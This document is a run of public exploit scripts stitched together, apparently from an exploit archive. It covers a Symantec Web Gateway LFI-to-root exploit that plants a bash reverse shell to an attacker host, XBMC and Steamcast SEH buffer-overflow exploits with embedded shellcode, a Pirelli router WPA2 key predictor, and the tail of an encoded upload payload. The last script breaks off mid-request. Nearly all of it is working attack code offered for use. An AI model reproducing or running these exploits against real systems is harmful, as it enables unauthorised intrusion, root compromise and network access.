'\x2C\xC1\x15\x86\x7E\xC8\x5C\x31\xE2\x2E\x0B\xE2\x30\xF0\xA5\x90' +
'\xCC\xF7\xDC\x99\xC1\xD8\xA5\x84\x3B\x2C\xE2\xD7\x02\x04\x01\x1E' +
'\x85\x42\x06\xA0\x23\xCE\x95\xE3\x22\x77\xC9\x22\xAD\x05\x83\x64' +
'\x5C\xB1\x07\x09\x3F\x42\x5C\x9A\xC0\x6A\x2C\x1D\x6F\xC4\xA2\x74' +
'\x47\x58\xBB\x18\x0B\xC6\x15\x7D\x84\xBA\x25\x82\x48\x32\xCF\x67' +
'\xAE\xC3\x97\xCD\xD9\x7C\xC2\x47\x82\x59\x5C\x39\x77\x35\x5B\xB2' +
'\xD1\x1D\xE2\xA7\x00\x44\x91\x08\x27\x92\x81\x25\xC1\x46\x94\xD8' +
'\xE3\x57\x2E\x6E\xF8\x6C\xE6\xC7\x45\x52\xF3\xC8\xA4\xED\x2B\x8D' +
'\x98\xD6\xCC\x0D\x25\x78\x74\x3D\xC6\xF1\x58\x3E\x74\x43\xF5\x70' +
'\xE0\x70\x92\x56\xB2\x97\xE7\x27\xEC\x46\xD3\x41\x56\x65\x8A\xDD' +
'\x08\xB9\xBF\x08\x23\x28\xDF\x28\xE4\x13\x86\xAF\xC3\x50\x80\x5E' +
'\xF9\xC3\x68\x0A\x7F\x0E\x68\x7B\x78\xEF\xC1\xA0\xED\x80\xBA\x39' +
'\x57\x71\x24\x98\x03\x27\x3D\xBB\x8C\xE7\x03\x3D\x72\x86\xEA\x69' +
'\x71\x2D\xF6\x6C\x6C\x4D\x3B\xEA\x07\xF2\x87\x7A\xFB\xD3\x4B\xF6' +
'\x52\x78\x22\x44\x50\xCE\x35\x43\x3B\x71\x2C\xB4\x0E\xB1\xE8\x95' +
'\x54\x99\x44\xB7\x91\x42\x09\x54\x82\x1D\x93\x37\xFD\xC4\x1B\x76' +
'\xEC\x63\x0B\x95\x40\xC6\x27\xBC\xBF\x75\xD2\xA6\x1C\x23\x13\x63' +
'\x3F\x20\xB4\x78\x44\x2E\x4E\x1D\x40\xA4\x73\x05\x49\x50\x24\x13' +
'\x50\x66\x6F\xBA\x17\xAF\xCE\x2E\x2F\x58\xFB\xF4\x2D\x7B\xD3\xEE' +
'\xF5\xDA\xA7\x17\x6F\x0F\xA0\x8C\xF8\xE2\x2E\x12\x59\x9B\xA2\x24' +
'\x76\x60\x19\xCE\xD0\xB0\x99\xE1\x09\xC9\xC2\xEB\xA3\x5E\xE7\x15' +
'\x96\xB4\x9F\x77\x4F\xBA\x17\x6F\x19\x70\x39\xEE\x5E\x9C\x1E\xF5' +
'\xFB\xEC\xF8\xAC\x87\x52\x38\x6F\xF7\x2E\xBA\x9D\xCB\x93\x76\x8F' +
'\x9D\x5F\xF6\xCE\xCF\xFA\x47\x88\x7E\x5F\x90\x5B\x82\x0C\xAC\x41' +
'\x68\xA8\x40\xC6\xB3\xDB\x22\x02\x05\x95\xE9\x83\xBF\x45\x5C\x24' +
'\xBC\x73\x6D\x36\xE6\x38\xB5\x84\xC2\x12\x68\xC5\x36\xE3\xCC\x42' +
'\x45\x6D\x80\x3D\x77\x7D\x6F\x44\xA6\xE8\x31\x75\x3A\x25\x40\x1E' +
'\x30\x67\x48\x79\x56\x64\x53\xB4\x75\x95\x85\xEB\x62\x51\x44\xEA' +
'\x59\x86\xC2\xB2\x61\x42\x8B\x7B\xD7\x2E\xB0\xEF\x47\xD0\x87\x8D' +
'\x63\x67\x08\xFB\xC7\x2E\xE6\x42\x91\x3D\xF7\x65\x44\x2B\x5E\xB7' +
'\xD1\xAA\x4D\xB3\x52\xC2\xE0\x35\xD9\x65\xBF\x6D\xFC\x4F\x54\xF5' +
'\x26\x15\x49\x36\xE7\x45\xB9\xB6\x22\x29\x46\x64\x42\x78\x96\x1F' +
'\x87\xE8\x03\x36\x41\x29\x71\x0C\x46\x8C\x26\xD4\x0C\x65\x91\x72' +
'\x2A\xF4\x6F\x54\x6B\x94\x94\x39\x32\x1E\x8D\xD0\xEE\x94\xAB\x7A' +
'\xB3\x09\x62\x15\x6D\xD8\x14\x17\xCE\x50\xF4\xB3\x74\x2B\x73\x70' +
'\xB5\x82\xAE\x84\x09\xE1\x86\xEA\x46\x96\x5F\x51\x3C\xD9\x45\xE7' +
'\x1C\xBE\x79\x9E\xD0\x07\x28\xB8\xCB\x91\x5F\xE9\x41\xAC\x7B\x4E' +
'\x75\xCF\x02\x3F\x8C\x0C\x6D\x4F\x25\x9E\x13\x38\x70\x67\x5E\x5B' +
'\x23\x87\xEA\x85\x27\x67\xB4\x30\xF6\x3C\x82\x99\xEB\x5E\x04\xA6' +
'\x40\x87\x41\x02\x2C\x64\x79\x1E\x70\x6B\x4C\x18\x87\x13\xF4\xAE' +
'\x59\x21\x45\xEE\xC4\x99\x38\x7A\x52\xC8\x15\x8F\x01\xC0\xAC\x01' +
'\xAA\xDA\x53\xDE\xA0\xE0\x05\x9F\x0C\x70\xD6\x1B\x5C\xE1\x38\x77' +
'\x4D\x9B\x85\xE2\x5D\xEC\x00\x79\xCC\x98\x79\x8F\xA9\x1B\xB5\xAF' +
'\x8B\x84\x70\xE3\x6B\x32\x82\xC4\xA1\x22\x99\xAF\x76\x05\x9D\x4A' +
'\x91\x56\x6C\xE8\xB8\x54\x6E\x1A\x27\x1F\xD9\x15\xE2\x18\x19\x7A' +
'\xBA\x29\xCD\xF7\x86\xAE\x7A\xE0\x21\xAA\x52\xF9\xA1\xB5\xD8\x71' +
'\xFB\xA4\x7F\x94\xB4\xC2\x37\x8E\x67\xFB\x53\x55\xB3\x28\x1C\xC4' +
'\x11\x61\x0F\x60\xBD\x14\x39\xF8\xE1\x07\x3A\xCA\x2A\xCB\x84\xB0' +
'\x93\x3C\xB7\xB9\x40\x58\x1D\xA9\x07\x65\xDE\x75\x10\xA2\xC0\xF2' +
'\x22\xB7\x08\xE0\xA5\xF3\xBE\xA0\xA7\x0F\x55\x30\x16\x86\xF8\xC7' +
'\x45\x72\xDF\xC0\x0D\x4A\xD0\x14\xC1\x4B\x89\x7C\x9B\x63\xA7\x1C' +
'\x40\xF5\x8E\xA3\x28\xD8\x2F\x97\xEF\x64\x4F\x99\xD2\x76\x05\x5B' +
'\xA3\x46\x40\x13\x60\x24\x22\x20\x15\x5B\xD7\x46\x2E\x47\x40\x93' +
'\xFF\x03\x97\x82\xC4\xF2\x15\x9C\x5C\x77\xBF\x3F\xEA\xF5\xBB\x67' +
'\xA7\x74\x6E\x37\x8D\x0A\x0E\xE4\xBB\x4E\x80\x1F\x7B\x66\xAB\x6A' +
'\x98\x4D\xE3\xC9\x13\xC3\xAC\xD5\xF7\x0E\x18\xA3\x89\x8F\x5E\xF9' +
'\xF2\x88\x5D\xBC\xEA\xF6\x73\xBB\x94\x4B\x50\x34\xAB\xB5\xFA\x41' +
'\x72\x7E\xF8\x58\xC5\x1A\xC7\xDE\xF5\x40\x3A\x3F\x0A\x52\xAC\x57' +
'\x2A\xB0\xAE\x1A\xD3\x80\xE3\x02\x1D\x9F\x71\x41\x84\xA1\x1F\x2E' +
'\x5E\xD0\xFE\xC3\x85\xD8\xE3\x00\xBB\xC4\xD1\xCF\xD1\xD8\xEC\x03' +
'\x56\xBE\x72\xBC\xB2\x1C\xB3\x92\xB3\x07\x3D\x0D\x37\x14\xC9\xAC' +
'\x2D\xAE\xE2\x91\xFE\x9E\x16\x54\x12\x0D\x84\x2B\x06\x2C\xEE\x90' +
'\x20\x41\x1C\xD0\x61\xF4\x7C\xE6\x37\xBE\x63\xB3\x1F\xFD\xC9\x15' +
'\x86\x2A\x73\x39\x3A\x07\x2D\x55\x79\x4A\x51\x1B\x20\xA6\xD7\x34' +
'\x9A\xA8\x8C\x10\x29\x82\xF7\x36\x5C\x45\x35\x7E\x54\x22\xA1\x00' +
'\xFC\x29\xEA\x82\x8C\xA6\x39\xA0\x22\x88\x8D\x89\x62\xA9\xD4\x13' +
'\x52\xAA\x64\x5B\xDA\x15\x09\xF1\x06\x30\x8E\x51\x73\x51\x38\x33' +
'\x0C\x23\x07\x1F\xF3\xE9\x5B\x90\x81\x78\x8F\xA1\x28\xF3\x7B\xB7' +
'\xEE\xEC\x15\x0A\xEC\xA7\xDC\x36\x6C\x1F\x93\x73\x64\x50\x0D\x11' +
'\x2A\x50\xFD\xB2\x66\xBE\x19\x16\x47\xB9\xED\xDD\x00\xBB\x1D\x2E' +
'\x3C\x90\x7A\x7F\x93\xDB\xA6\x7D\xF4\xBD\x43\x56\x32\x95\xD1\xED' +
'\x20\x74\x70\x0E\x8B\xF2\x3B\x47\xBD\xDE\x59\x6F\x9F\x75\xB8\xB7' +
'\x17\x51\x66\x5F\xEF\xA8\x97\x3E\x64\x31\x6F\x16\xD2\x77\x36\xA9' +
'\x09\xBD\x58\xDD\x44\x46\xA9\x2C\x38\xD7\xAE\xD0\x35\x49\xDA\xCA' +
'\xE3\xD7\xD4\xB2\x16\x3B\xC9\x1C\x16\x74\x56\xA9\x2A\xDD\x15\x1C' +
'\xD5\xA7\xB4\xDF\x10\xB2\x34\x2A\xD0\x57\xD1\xC4\x89\x15\x0C\xD9' +
'\x54\x8D\xD5\x6B\x61\xEB\xDD\x55\x55\x51\xFF\x90\x8E\x8D\xAA\x5E' +
'\xF9\x28\x94\x5D\xE9\xA3\xA4\x9A\x77\x1F\x07\x40\xCD\xD3\xC9\x3C' +
'\xC8\x7D\x60\xC2\x45\xE2\xA8\x17\x9B\x89\x21\x90\x8B\xD3\xEE\xE9' +
'\xCB\x7D\x76\x8C\x04\xD0\xF3\x60\x1E\x6B\x55\xD7\x48\x14\xFC\x87' +
'\xEE\x15\xA9\x6E\x41\xB6\x28\x3C\x34\x63\x86\x3C\xE2\xAE\x41\xBB' +
'\x7E\x50\xE9\xD5\x19\x73\x6F\xA4\x73\x90\x49\x3E\x44\xCF\x42\xCB' +
'\xB3\xD0\xB1\x66\x39\x6B\x8C\xEF\xF9\x9D\x32\x29\x93\x6A\x0F\x5B' +
'\xDC\x08\x35\x06\xE3\x09\x97\xD7\x04\x81\xE3\x81\x28\x62\x1B\x3B' +
'\xA7\x2E\xA9\x3A\x4E\x93\x5E\x0F\xFC\xA5\x97\x6D\x94\x56\x49\x5E' +
'\x9F\x51\xEB\x4D\x6F\xDE\x4E\x0B\xD4\x1C\xDA\x2F\x1E\x7D\x48\x9F' +
'\xAA\x47\xA2\x0B\x14\x99\xAA\x71\x7C\xA0\x44\x3D\x5F\x7F\xA2\xEB' +
'\x16\x59\x8D\x76\xA4\x00\x7C\xA5\x16\x16\x96\x80\x4A\xB4\x90\x1B' +
'\x6A\x99\x06\x7B\x8E\xB5\x06\xA0\x1F\xF0\xA9\x97\x8C\x99\x24\x0B' +
'\xA8\x84\xE7\x8D\x1B\x0C\x18\xDE\x10\x57\x9B\xE5\x73\x68\x2C\x15' +
'\x76\xF8\x2C\xF9\xB9\x13\x38\x81\xD8\x29\xB2\x9D\x70\xA7\x50\x54' +
'\xC9\x26\x23\x1B\xA4\xC5\xA1\x3C\xA2\x7B\x9A\x31\xAA\x3C\x1B\x3B' +
'\x20\x59\xAA\x44\x31\x2A\xD0\xA3\x43\x7F\x42\xD6\xCC\x15\xD6\xA6' +
'\x0B\xD6\x88\x39\xAE\x37\x97\xB2\x2B\xB2\x56\x5D\x6D\x8D\xA5\xD6' +
'\x80\xC2\xA6\xD6\x28\x8E\xBB\x69\x55\x1C\x2E\x4C\x2C\xDD\x13\x11' +
'\x81\x65\x8C\x28\x42\x30\x2A\x69\x9D\x0A\x87\x23\x07\xA0\x51\x68' +
'\x3B\x96\xC8\xA7\x86\x0A\xCB\xE1\x59\xAA\x6D\x79\x1B\x87\x95\x61' +
'\x12\x8A\x42\x87\x33\x10\x24\xE2\x5B\xC4\x98\xBC\x52\x3A\xAB\x75' +
'\x7A\x72\xE9\x7B\xFB\xEC\xCC\xB2\xA8\x80\x89\x0A\x28\xAC\x65\xC2' +
'\x29\x48\xB5\x98\xD2\x70\x3F\x1E\x8D\x97\xC7\x36\xD8\x9A\xEB\x4A' +
'\xD5\x3A\xC7\x62\xC6\xA6\x3E\x9C\xCA\xAD\xA0\x05\x79\xFD\x9C\x7F' +
'\xAF\xFC\xA3\xC8\x28\xF7\xD6\xA8\x98\x9F\x57\xA9\xAE\x53\x91\xCA' +
'\x63\x55\x52\x73\xCC\xFA\xD4\x81\xA4\x24\x9A\x0A\x7E\x8E\x80\x08' +
'\xFB\xA3\xF7\xD9\x80\x06\x15\xB3\xAF\x0A\x46\x95\xEE\x74\x4C\x5C' +
'\x24\x6F\xA6\xED\xBA\x33\x16\xA8\x30\x62\x09\x44\x22\x41\x5F\x96' +
'\xF9\x9A\xEE\x67\x43\xE1\x0F\xB5\x07\x85\xD5\x1D\x59\x9F\xC8\x17' +
'\x69\x1E\xD8\xAE\xE3\x61\x74\xD9\xBA\xA7\x5D\xE1\x89\xAE\x0F\xE6' +
'\x2D\xF7\xCE\xAE\xFD\x8B\x17\x38\x2D\x2D\xEE\x96\xA2\xB6\x76\xC7' +
'\x34\x27\x3F\xB3\xDD\x1B\xAE\xCE\x92\x11\xF1\x2A\xD5\x03\xA9\x01' +
'\x22\xF7\x69\x73\xD0\x29\x8F\x25\xE8\x12\x59\x06\xA9\x52\x6B\x52' +
'\x35\x14\x5D\x90\xD4\x5D\x3A\x62\x89\xD2\x69\x87\x69\x05\xBE\xC1' +
'\x27\x34\x6A\xCA\x2F\xC5\x17\x74\xD1\x25\x36\x17\xC2\x3F\x0F\x33' +
'\xF9\xB8\xEB\xC5\x93\x81\xA5\x1A\xAE\x3D\x20\x55\xCC\x00\xAC\x5D' +
'\x66\x8F\x89\x4D\x2C\x4D\xE8\x89\x6E\x76\xC4\x4B\x8A\x8A\x96\x50' +
'\x48\xC9\xDB\xAE\x9A\x41\xFA\x58\x9D\x74\x14\x55\xCD\x14\x4D\x6D' +
'\xBC\xA8\x8E\x09\x4A\x19\x87\x2C\x4E\x99\x91\xA0\xB7\x27\xE9\x19' +
'\xBA\xA7\x1A\x7D\xC7\x1B\x2C\xFB\xAF\x5D\x48\xC2\xA0\x66\xAB\xE2' +
'\x34\x05\x76\x9B\x86\x67\x9D\xEF\x58\xEF\xA8\xFD\x42\x83\xBF\xEB' +
'\x78\x84\xD8\x21\x1D\xFC\xB9\x3D\xB7\x73\x4B\xBA\x94\xD6\x27\x2D' +
'\xED\x33\x6D\x40\x1B\x1B\xAA\x07\x5F\xAC\x33\x7D\xB7\x70\x1B\xDD' +
'\x4F\x3D\xFB\xD2\xE3\xA9\xEC\xA2\xC6\xA7\x62\x4E\x00\xA8\xC0\x47' +
'\x56\x70\x27\xDB\x6F\x11\x58\x08\xDD\x06\x28\xE8\x8C\xF8\x34\x0E' +
'\x0B\xD6\x36\xC2\x42\xD9\x5B\x8D\x46\x02\xE9\xCF\x42\x42\x25\xEB' +
'\xCF\x43\xA2\xBA\x31\x12\xD8\xE4\xB3\x48\x54\xEF\x81\x04\xEC\x6D' +
'\x8A\x04\xB0\x18\x5A\x2E\x4E\xF4\x49\xC7\x3A\x98\xFF\x4C\x73\xE8' +
'\xCE\x25\xF3\xEE\x25\x55\xA4\x6A\xD0\xA5\x97\x93\xA9\xA5\xE9\xCF' +
'\x89\x3A\x43\x91\x83\x9A\x6F\xDB\xBE\xA0\xD7\x75\x7A\x1E\x29\x42' +
'\xB8\x07\x76\x34\x27\x62\x76\xCA\xF5\x69\x6D\xBE\x4B\x21\x22\x06' +
'\xEB\x8C\xE2\x90\x8E\x01\x11\x1B\x83\xA8\xA3\x22\xE9\x9D\x18\x31' +
'\xAE\xB4\xBD\xA8\xA3\x1A\xA7\xF8\x05\x22\x3D\xC7\x15\x72\xF3\xFF' +
'\x1B\x99\x20\x04\xC8\xE8\x1D\x95\x37\x52\x31\xD1\xFC\x27\xD1\xBD' +
'\xED\x9D\x6C\x27\x51\xFA\xC1\xDB\x49\x71\xFA\xE6\x19\xCB\x41\x7E' +
'\xED\xD7\xBE\x99\x64\x92\x49\x26\x99\x64\x92\x49\x26\x99\x64\x92' +
'\x49\x26\x99\x64\x92\x49\x26\x99\x64\x92\x49\x26\x99\x64\x92\xC9' +
'\x6F\x58\xFE\x0B\x3E\xE1\xD0\x84\x00\x50\x00\x00';

// UPLOAD THE THINGIE...
fileUpload(url,data,fileName,nameVar,ctype);
timeMsg();
#!/usr/bin/python

'''

The original patch for the Symantec Web Gateway 5.0.2 LFI vulnerability removed the
/tmp/networkScript file but left the entry in /etc/sudoers, allowing us to simply
recreate the file and obtain a root shell using a different LFI vulnerability.

Timeline:

# 06 Jun 2012: Vulnerability reported to CERT
# 08 Jun 2012: Response received from CERT with disclosure date set to 20 Jul 2012
# 26 Jun 2012: Email received from Symantec for additional information
# 26 Jun 2012: Additional proofs of concept sent to Symantec
# 06 Jul 2012: Update received from Symantec with intent to fix
# 20 Jul 2012: Symantec patch released: http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2012&suid=20120720_00
# 23 Jul 2012: Public Disclosure

'''

import socket
import sys
import base64

print "[*] #########################################################"
print "[*] Symantec Web Gateway 5.0.3.18 LFI Remote ROOT RCE Exploit"
print "[*] Offensive Security - http://www.offensive-security.com"
print "[*] #########################################################\n"

if (len(sys.argv) != 4):
	print "[*] Usage: symantec-web-gateway-0day.py <RHOST> <LHOST> <LPORT>"
	exit(0)

rhost = str(sys.argv[1])
lhost = sys.argv[2]
lport = sys.argv[3]

# Base64 encoded bash reverse shell
# Payload does sudo-fu abuse of sudoable /tmp/networkScript with apache:apache permissions

payload= '''echo '#!/bin/bash' > /tmp/networkScript; echo 'bash -i >& /dev/tcp/'''+lhost+'/' + lport 
payload+=''' 0>&1' >> /tmp/networkScript;chmod 755 /tmp/networkScript; sudo /tmp/networkScript'''
payloadencoded=base64.encodestring(payload).replace("\n","")

taint="GET /<?php shell_exec(base64_decode('%s'));?> HTTP/1.1\r\n\r\n" % payloadencoded
trigger="GET /spywall/languageTest.php?&language=../../../../../../../../usr/local/apache2/logs/access_log%00 HTTP/1.0\r\n\r\n"

print "[*] Super Sudo Backdoor injection, w00t"
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect((rhost, 80))
expl.send(taint)
expl.close()

print "[*] Triggering Payload ...3,2,1 "
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect((rhost, 80))
expl.send(trigger)
expl.close()
print "[*] Can you haz shell on %s %s ?\n" % (lhost,lport)

#!/usr/bin/env python 

'''
Xbmc get request remote buffer overflow 8.10 *seh*(Universal address)!!  

Tested:Win xp sp2 eng Win vista sp1
Vendor url:http://xbmc.org/ 
Release date:April the 4th 2009

versions affected: windows all versions. 

I had tried awhile to get a nice pop ebx pop ret address and just   
could not find a suitable one especially that was any good.and it   
had to be shipped with the application and not have /safe seh.  
  
To start with i looked at the zlib.dll to see of there were any 
nice pop pop ret address i noticed there was one in particular that 
stood out and decided to try it. 
 
There is no need for me to release any more exploits for this application  
as i have covered all the areas which i wanted to and want to   
move on from this. 
 
If your interested to see how this worked attach a debugger and add some 
hit tracing :).It is possible to use this with all the buffer overflows 
i released. 

Credits to n00b for finding the buffer overflow and writing  
exploit.

----------
Disclaimer
----------
The information in this advisory and any of its
demonstrations is provided "as is" without any
warranty of any kind.

I am not liable for any direct or indirect damages
caused as a result of using the information or
demonstrations provided in any part of this advisory.
Educational use only..!!
'''


import sys, socket 
import struct

port = 80 
host = sys.argv[1] 

#1635
Junk_buffer1 = 'A'*998
Pointer_To_Next_SEH = struct.pack('<L',0x909006eb)

###
###/SafeSEH Module Scanner, item 55
# SEH mode=/SafeSEH OFF
# Base=0x62e80000
# Limit=0x62e97000
# Module Name=C:\Program Files\XBMC\zlib1.dll

###
###This was found in the module zlib1 and is universal.
#62E83BAC   5B               POP EBX
#62E83BAD   5D               POP EBP
#62E83BAE  ^E9 CDD9FFFF      JMP zlib1.compressBound
SE_Handler = struct.pack('<L',0x62E83BAC)


Junk_buffer3 = 'D'*635
Shell_code=(#
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x54"
"\x42\x50\x42\x50\x42\x30\x4b\x58\x45\x54\x4e\x33\x4b\x38\x4e\x57"
"\x45\x30\x4a\x37\x41\x30\x4f\x4e\x4b\x58\x4f\x44\x4a\x41\x4b\x38"
"\x4f\x35\x42\x42\x41\x30\x4b\x4e\x49\x34\x4b\x58\x46\x33\x4b\x58"
"\x41\x30\x50\x4e\x41\x33\x42\x4c\x49\x39\x4e\x4a\x46\x58\x42\x4c"
"\x46\x37\x47\x30\x41\x4c\x4c\x4c\x4d\x50\x41\x50\x44\x4c\x4b\x4e"
"\x46\x4f\x4b\x53\x46\x55\x46\x32\x46\x30\x45\x47\x45\x4e\x4b\x48"
"\x4f\x35\x46\x32\x41\x50\x4b\x4e\x48\x36\x4b\x58\x4e\x50\x4b\x54"
"\x4b\x58\x4f\x35\x4e\x31\x41\x50\x4b\x4e\x4b\x38\x4e\x41\x4b\x38"
"\x41\x30\x4b\x4e\x49\x38\x4e\x45\x46\x52\x46\x50\x43\x4c\x41\x53"
"\x42\x4c\x46\x46\x4b\x48\x42\x44\x42\x43\x45\x38\x42\x4c\x4a\x37"
"\x4e\x50\x4b\x48\x42\x44\x4e\x50\x4b\x48\x42\x57\x4e\x51\x4d\x4a"
"\x4b\x48\x4a\x46\x4a\x30\x4b\x4e\x49\x30\x4b\x58\x42\x58\x42\x4b"
"\x42\x30\x42\x50\x42\x30\x4b\x48\x4a\x46\x4e\x43\x4f\x55\x41\x43"
"\x48\x4f\x42\x56\x48\x55\x49\x58\x4a\x4f\x43\x38\x42\x4c\x4b\x57"
"\x42\x55\x4a\x46\x4f\x4e\x50\x4c\x42\x4e\x42\x46\x4a\x36\x4a\x49"
"\x50\x4f\x4c\x48\x50\x30\x47\x35\x4f\x4f\x47\x4e\x43\x46\x41\x56"
"\x4e\x46\x43\x56\x50\x42\x45\x56\x4a\x37\x45\x36\x42\x30\x5a"
)

# create a socket object called 'c' 
c = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

# connect to the socket 
c.connect((host, port)) 

Request = (Junk_buffer1 + Pointer_To_Next_SEH + SE_Handler + Shell_code + Junk_buffer3)

# create a file-like object to read 
fileobj = c.makefile('r', 0) 

# Ask the server for the file 
fileobj.write("GET /"+Request+" HTTP/1.1\n\n") 

# milw0rm.com [2009-04-06]
#!/usr/bin/python 
# 
# Pirelli Discus DRG A225 WiFi router 
# Default WPA2-PSK algorithm vulnerability 
#
# paper: http://milw0rm.com/papers/313
# 
# With this code we can predict the WPA2-PSK key... 
# 
# Hacked up by Muris Kurgas aka j0rgan 
#            j0rgan (-@-) remote-exploit.org 
#        http://www.remote-exploit.org 
# 
# Use for education or legal penetration testing purposes..... 
#  
import sys 
 
def hex2dec(s): 
 return int(s, 16) 
 
if len(sys.argv) < 2 or len(sys.argv[1]) != 6: 
 print "\r\nEnter the last 6 chars from Discus SSID" 
 print "i.e. SSID should be 'Discus--XXXXXX', where XXXXXX is last 6 chars\r\n" 
 exit() 
const = hex2dec('D0EC31') 
inp = hex2dec(sys.argv[1]) 
result = (inp - const)/4 
 
print "Possible PSK for Discus--"+sys.argv[1]+" would be: YW0"+str(result) 

# milw0rm.com [2009-04-06]
#!/usr/bin/python
#[*] Usage : exploit.py [victime_ip]
#[*] Bug : 	    XBMC 8.10 (HEAD Request) Remote Buffer Overflow Exploit (SEH)
#[*] Refer :        http://www.milw0rm.com/exploits/8354
#[*] Tested on :    Xp sp2 (fr)
#[*] Exploited by : His0k4
#[*] Greetings :    All friends & muslims HaCkErs (DZ),snakespc.com,secdz.com
#[*] Chi3arona houa : Serra7 merra7,koulchi mderra7 :D


import struct
import sys, socket 

host = sys.argv[1] 

buff1 = 'A'*998

Pointer_To_Next_SEH = struct.pack('<L',0x909006eb)

###
###This was found in the module zlib1 and is universal.
#62E83BAC   5B               POP EBX
#62E83BAD   5D               POP EBP
#62E83BAE  ^E9 CDD9FFFF      JMP zlib1.compressBound
SE_Handler = struct.pack('<L',0x62E83BAC)

# win32_exec -  EXITFUNC=seh CMD=calc Size=343 Encoder=PexAlphaNum http://metasploit.com
shell_code=(
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x54"
"\x42\x50\x42\x50\x42\x30\x4b\x58\x45\x34\x4e\x33\x4b\x58\x4e\x37"
"\x45\x30\x4a\x37\x41\x30\x4f\x4e\x4b\x38\x4f\x44\x4a\x51\x4b\x48"
"\x4f\x45\x42\x42\x41\x50\x4b\x4e\x49\x34\x4b\x48\x46\x33\x4b\x38"
"\x41\x50\x50\x4e\x41\x33\x42\x4c\x49\x59\x4e\x4a\x46\x58\x42\x4c"
"\x46\x37\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x50\x44\x4c\x4b\x4e"
"\x46\x4f\x4b\x33\x46\x35\x46\x52\x46\x50\x45\x57\x45\x4e\x4b\x38"
"\x4f\x55\x46\x42\x41\x50\x4b\x4e\x48\x36\x4b\x58\x4e\x30\x4b\x54"
"\x4b\x38\x4f\x35\x4e\x31\x41\x50\x4b\x4e\x4b\x48\x4e\x51\x4b\x38"
"\x41\x50\x4b\x4e\x49\x58\x4e\x45\x46\x32\x46\x50\x43\x4c\x41\x33"
"\x42\x4c\x46\x36\x4b\x48\x42\x34\x42\x53\x45\x58\x42\x4c\x4a\x57"
"\x4e\x30\x4b\x38\x42\x54\x4e\x30\x4b\x38\x42\x47\x4e\x31\x4d\x4a"
"\x4b\x48\x4a\x56\x4a\x50\x4b\x4e\x49\x50\x4b\x48\x42\x38\x42\x4b"
"\x42\x50\x42\x30\x42\x30\x4b\x58\x4a\x56\x4e\x43\x4f\x35\x41\x43"
"\x48\x4f\x42\x36\x48\x55\x49\x48\x4a\x4f\x43\x58\x42\x4c\x4b\x57"
"\x42\x55\x4a\x56\x42\x4f\x4c\x38\x46\x30\x4f\x35\x4a\x46\x4a\x39"
"\x50\x4f\x4c\x38\x50\x50\x47\x55\x4f\x4f\x47\x4e\x43\x46\x41\x46"
"\x4e\x36\x43\x36\x42\x30\x5a"
)
buff2 = 'B'*635

payload = buff1 + Pointer_To_Next_SEH + SE_Handler + shell_code + buff2

head  = "HEAD /"+payload+" HTTP/1.1\r\n"
head += "Host: "+host+"\r\n"


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,80))
s.send(head + "\r\n\r\n")
s.close()

# milw0rm.com [2009-04-07]
#!/usr/bin/python
#[*] Usage   : steamcast.py [victime_ip]
#[*] Bug     : Steamcast(HTTP Request) Remote Buffer Overflow Exploit (SEH) [1]
#[*] Founder : Luigi Auriemma, thx to overflow3r for informing me about the vuln.        
#[*] Tested on :    Xp sp2 (fr)
#[*] Exploited by : His0k4
#[*] Greetings :    All friends & muslims HaCkErs (DZ),snakespc.com,secdz.com
#[*] Chi3arona houa : Serra7 merra7,koulchi mderra7 :D
#[*] Translate by Cyb3r-1st : esse7 embe7 embou :p

#Note : The problem is that we need to find a dll wich its not compiled with GS, in my case i founded idmmbc its a loaded dll of internet download manager so try to find an unsafe dll.

import sys, socket
import struct

host = sys.argv[1]
port = 8000

# win32_exec -  EXITFUNC=seh CMD=calc Size=160 Encoder=PexFnstenvSub http://metasploit.com
shellcode=(
"\x2b\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xc6"
"\x90\xb4\x70\x83\xeb\xfc\xe2\xf4\x3a\x78\xf0\x70\xc6\x90\x3f\x35"
"\xfa\x1b\xc8\x75\xbe\x91\x5b\xfb\x89\x88\x3f\x2f\xe6\x91\x5f\x39"
"\x4d\xa4\x3f\x71\x28\xa1\x74\xe9\x6a\x14\x74\x04\xc1\x51\x7e\x7d"
"\xc7\x52\x5f\x84\xfd\xc4\x90\x74\xb3\x75\x3f\x2f\xe2\x91\x5f\x16"
"\x4d\x9c\xff\xfb\x99\x8c\xb5\x9b\x4d\x8c\x3f\x71\x2d\x19\xe8\x54"
"\xc2\x53\x85\xb0\xa2\x1b\xf4\x40\x43\x50\xcc\x7c\x4d\xd0\xb8\xfb"
"\xb6\x8c\x19\xfb\xae\x98\x5f\x79\x4d\x10\x04\x70\xc6\x90\x3f\x18"
"\xfa\xcf\x85\x86\xa6\xc6\x3d\x88\x45\x50\xcf\x20\xae\x60\x3e\x74"
"\x99\xf8\x2c\x8e\x4c\x9e\xe3\x8f\x21\xf3\xd5\x1c\xa5\x90\xb4\x70")

exploit = "\x41"*1003 + "\xEB\x06\x90\x90" + "\xDB\x27\x02\x10" + "\x90"*20 + shellcode

while 1:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	head =  "GET / HTTP/1.1\r\n"
